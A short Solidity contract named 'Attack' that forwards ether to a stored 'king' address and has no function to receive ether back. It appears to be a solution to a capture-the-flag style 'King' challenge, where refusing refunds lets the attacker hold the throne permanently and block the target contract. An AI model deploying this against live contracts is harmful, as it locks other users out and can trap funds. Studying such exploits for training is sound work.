// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {
    address payable king;

    constructor(address payable _kingAddress) {

        king = _kingAddress;

    }

    function attack() external payable {
        (bool success,) = king.call{value: msg.value}("");
    }
}
